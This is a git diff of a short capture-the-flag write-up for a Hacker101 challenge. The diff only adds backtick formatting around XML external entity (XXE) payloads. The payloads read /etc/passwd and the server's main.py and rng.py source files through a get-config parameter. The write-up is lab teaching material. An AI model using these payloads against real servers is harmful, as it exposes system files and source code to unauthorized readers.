@@ -8,7 +8,7 @@ https://xxxxxxxxxxxx.ctf.hacker101.com/get-config
 
 On top of the page there is '<?xml version="1.0" encoding="UTF-8"?>' which indicates the server uses xml for config.
 
-xxe payload: <?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><config><location>&xxe;</location></config>
+xxe payload: `<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><config><location>&xxe;</location></config>`
 
 using this website the payload can be turned into url friendly format: https://www.urlencoder.org/
 
@@ -18,12 +18,12 @@ https://xxxxxxxxxxxx.ctf.hacker101.com/get-config?data=%3C%3Fxml%20version%3D%22
 
 The server is hosted with python so we can read the main.py file which has the first flag.
 
-<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "main.py">]><config><location>&xxe;</location></config>
+`<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "main.py">]><config><location>&xxe;</location></config>`
 
 ![Alt text](main.py)
 
 In the main file we can see the server is using a custom rng file.
 
-<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "rng.py">]><config><location>&xxe;</location></config>
+`<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "rng.py">]><config><location>&xxe;</location></config>`
 
 Now to reverse the pseudorng (see ![Alt text](flag2.md))...
